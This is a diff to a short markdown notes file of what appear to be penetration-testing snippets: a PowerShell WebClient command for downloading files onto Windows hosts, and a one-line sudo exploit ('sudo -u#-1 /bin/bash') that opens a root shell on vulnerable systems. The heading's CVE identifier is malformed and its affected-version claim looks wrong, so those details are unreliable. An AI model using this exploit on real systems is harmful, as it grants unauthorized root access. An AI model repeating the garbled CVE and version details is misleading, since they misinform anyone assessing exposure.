@@ -1,11 +1,10 @@
 # Notes
 
 ### Wget Alternative for Windows in PowerShell
-``
+```
 $client = new-object System.Net.WebClient
-
 $client.DownloadFile("URL","Local Download Path")
-``
+```
 
 ### CVE-2019-10-15 Sudo < 1.2.28 Privilege Escalation
 ``sudo -u#-1 /bin/bash``
